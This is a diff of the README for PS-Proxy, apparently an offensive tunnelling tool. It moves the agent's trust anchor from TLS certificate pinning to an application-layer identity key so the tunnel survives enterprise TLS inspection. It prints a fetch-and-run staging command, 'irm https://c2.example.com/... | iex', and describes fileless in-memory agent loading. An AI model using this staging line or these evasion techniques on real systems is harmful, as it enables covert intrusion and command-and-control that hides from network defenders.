@@ -23,9 +23,9 @@ administrator privileges on the Windows agent host.
 - **Enrollment:** the server creates a short-lived one-time staging URL. The
   generated agent script contains an enrollment token rather than a long-term
   PSK.
-- **TLS:** server certificate pinning is mandatory for the agent. The C# core
-  refuses to continue unless the presented server certificate matches the pinned
-  SHA-256 DER hash.
+- **Trust anchor:** TLS is transport and staging only. The agent pins the stable
+  PS-Proxy application identity public key and establishes an authenticated
+  encrypted tunnel inside TLS before enrollment tokens or tunnel frames are sent.
 - **Disk behavior:** release agents do not use `Add-Type`, do not invoke
   `csc.exe` on the target, and do not intentionally write the managed agent DLL
   to disk. The embedded DLL is loaded with
@@ -87,8 +87,11 @@ explicitly with `--agent-assembly-b64-file`.
 
 ## Start the server with transparent TCP routing
 
-Use a real certificate whose leaf DER hash will be pinned by the agent. On the
-Linux server, run as root so PS-Proxy can install and remove iptables NAT rules:
+Use a real certificate for HTTPS transport/staging. PS-Proxy will create or reuse
+`psproxy_identity.pem` as the application-layer trust anchor; keep this file
+stable across server restarts and redeployments so existing staged agents trust
+the same server identity. On the Linux server, run as root so PS-Proxy can
+install and remove iptables NAT rules:
 
 ```bash
 sudo ./psproxy-server \
@@ -114,9 +117,10 @@ The server prints a one-time command:
 irm https://c2.example.com/a/<one-time-id> | iex
 ```
 
-The generated script auto-starts, loads the embedded C# core in memory, validates
-the pinned server certificate, enrolls with the one-time token, and switches to
-the framed tunnel protocol.
+The generated script auto-starts, loads the embedded C# core in memory, verifies
+the staged PS-Proxy identity public key with an application-layer handshake,
+sends enrollment inside the encrypted/authenticated tunnel, and then uses that
+protected tunnel for all framed TCP and DNS relay traffic.
 
 ## Optional fixed-target developer TCP relay
 
@@ -151,8 +155,15 @@ connections during high-concurrency tools such as NetExec; the default is 256. W
 - Use HTTPS staging. Plain HTTP `irm | iex` is mechanically possible, but it is
   not acceptable for sensitive environments because staging tampering means code
   execution on the Windows host.
-- The agent pins the server certificate before enrollment or tunnel traffic.
-  Certificate pin mismatch is fatal.
+- TLS is transport only; do not use the HTTPS certificate as the PS-Proxy root of trust.
+- The server has a stable RSA identity key (`--identity-key`, default
+  `psproxy_identity.pem`). If the file is missing, the server generates a
+  3072-bit RSA key and logs the SHA-256 pin of the public key DER.
+- Keep `psproxy_identity.pem` stable and private. Rotating it intentionally
+  changes the PS-Proxy trust anchor and requires staging new agents.
+- The staged agent embeds the server identity public key, performs an
+  application-layer PSP1 handshake, verifies a server HMAC proof, and only then
+  sends enrollment/reconnect tokens inside encrypted authenticated frames.
 - Enrollment URLs are short-lived and one-time use.
 - The enrollment token is placed in the HTTPS response body, not in the URL.
 - Do not log generated agent bodies or enrollment tokens.
@@ -163,30 +174,33 @@ connections during high-concurrency tools such as NetExec; the default is 256. W
 
 ### TLS inspection / enterprise decryption
 
-If an authorized enterprise TLS inspection device presents a different leaf
-certificate to the Windows agent than the certificate loaded by the VPS server,
-agent certificate pinning will fail. The safest fix is to exempt the PS-Proxy
-server domain from TLS decryption so the agent sees the VPS certificate directly.
+PS-Proxy now treats HTTPS/TLS as transport and staging rather than as the tunnel
+root of trust. Enterprise TLS inspection products such as Palo Alto, Zscaler, or
+other decrypting proxies may present an enterprise-issued leaf certificate to the
+agent; this should no longer break agent/server trust because the agent verifies
+the staged PS-Proxy identity public key inside the TLS connection.
 
-For controlled labs where decryption cannot be bypassed, pass the inspected leaf
-certificate SHA-256 DER hash explicitly:
+Operational guidance:
 
-```bash
---agent-cert-pin-override <64-char-sha256-hex-pin>
-```
-
-Only use this when you control and trust the inspection device. This pins the
-agent to the certificate it actually sees, not the certificate file loaded by the
-VPS server.
+- Keep using HTTPS for staging so the one-time loader is not exposed to trivial
+  network tampering.
+- Keep `psproxy_identity.pem` private and stable. It is the PS-Proxy identity,
+  and its public key pin is what identifies the legitimate server to agents.
+- Back up `psproxy_identity.pem` with the same care as other server secrets. If
+  it is lost and regenerated, previously staged agents will not trust the new
+  identity unless they are restaged with the new public key.
+- TLS inspection can still observe the outer HTTPS transport metadata, but it
+  cannot read or tamper with protected PSP1 tunnel frames after the
+  application-layer handshake without detection.
 
 ## Current implementation status
 
 Implemented now:
 
 - Go TLS listener with mixed HTTP staging and raw agent tunnel handling.
-- Leaf certificate pin calculation for generated agent configuration.
+- Stable PS-Proxy RSA identity key generation/reuse with a logged public key pin staged into generated agents.
 - Short-lived one-time staging URLs.
-- One-time enrollment token validation for the raw tunnel plus reconnect-token authentication after first enrollment.
+- Application-layer PSP1 secure handshake before enrollment, followed by encrypted/authenticated frame transport and reconnect-token authentication after first enrollment.
 - Agent auto-reconnect with exponential backoff for transient tunnel failures.
 - Framed multiplexed stream protocol.
 - Linux transparent TCP redirect mode for direct local-tool TCP connections to routed target IPs.
